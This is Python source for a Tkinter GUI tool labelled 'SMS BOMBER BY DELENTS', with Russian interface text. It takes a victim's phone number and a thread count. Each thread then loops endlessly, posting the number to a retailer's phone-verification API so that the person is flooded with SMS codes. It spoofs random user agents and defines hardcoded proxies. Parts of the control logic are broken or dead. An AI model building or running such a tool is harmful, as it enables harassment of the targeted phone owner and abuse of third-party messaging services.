import requests, random
from requests import get
from bs4 import BeautifulSoup as bs
import colorama
from termcolor import colored
from tkinter import filedialog as fd
from tkinter import *
from tkinter import messagebox
from tkinter import Label
from random import randint
import threading, os, sys, time
import fake_useragent
colorama.init()
root = Tk()
root.title('SMS BOMBER BY DELENTS')
root.geometry('525x740')
root.configure(bg='black')
def good():                                 # legacy мусор
    print(colored('SMS sent', 'green'))     # legacy мусор


def error():                                # legacy мусор
    print(colored('SMS not sent', 'red'))   # legacy мусор

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
proxies1 = {"http":"http://203.32.120.175:80"}
proxies2 = {"http":"http://203.23.103.72:80"}
def spamNOproxy(_phone):
    while True:
        _name = ''
        for x in range(12):
            _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

        _email = _name + '@gmail.com'
        email = _name + '@gmail.com'
        _phone = _phone
        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers=headers)
            good()
        except Exception as e:
            error()
        time.sleep(60)
class Queue:

    def __init__(self):
        self.queue = []

    def get(self):
        if self.qsize() != 0:
            return self.queue.pop()

    def put(self, item):
        if item not in self.queue:
            self.queue.append(item)

    def qsize(self):
        return len(self.queue)

    def __str__(self):
        return str(self.queue)

var = IntVar()

def StartThread():
    number = text1.get('1.0', 'end')
    try:
        thrade = int(text2.get('1.0', 'end'))
    except:
        messagebox.showinfo(title='Warning', message='Не корректный формат потоков', command=StopThread)

    try:
        if thrade > 20:
            messagebox.showinfo(title='Warning', message='Превышен максимум потоков', command=StopThread)
    except:
        pass

        try:
            if len(number) < 12 or file_name == None:
                messagebox.showinfo(title='Warning', message='Неправильный формат номера')
            else:
                messagebox.showinfo(title='Запущено', message='Бомбинг запущен')
                for i in range(thrade):
                    t = threading.Thread(target=spam, args=(number,))
                    t.start()

        except:
            pass

    else:
        spam = spamNOproxy
        if len(number) < 12:
            messagebox.showinfo(title='Warning', message='Неправильный формат номера')
        else:
            messagebox.showinfo(title='Следи за процессом в Terminal', message='Бомбинг запущен')
            for i in range(thrade):
                t = threading.Thread(target=spam, args=(number,))
                t.start()


root.resizable(False, False)

text1 = Text(root, height=1, width=15, font='Ubuntu')
text1.pack()
text1.place(x=190, y=100)
text2 = Text(root, height=1, width=2, font='Ubuntu')
text2.pack()
text2.place(x=242, y=160)
label1 = Label(text='Введите номер в формате 7XXXXXXXXXX', fg='black', bg='orange')
label1.pack()
label1.place(x=152, y=127)
label2 = Label(text='Потоки (Максимум 20)', fg='black', bg='orange')
label2.pack()
label2.place(x=190, y=187)
poetry = 'SMS Bomber'
label3 = Label(text=poetry, height=2, width=75, bg="orange", fg="black", justify=CENTER)
label3.place(x=0, y=0)

crack = Button(text='Запустить', height=2, width=30, background='orange', fg="black", activebackground="red", command=StartThread)
crack.pack()
crack.place(x=150, y=600)
root.mainloop()
root.mainloop()
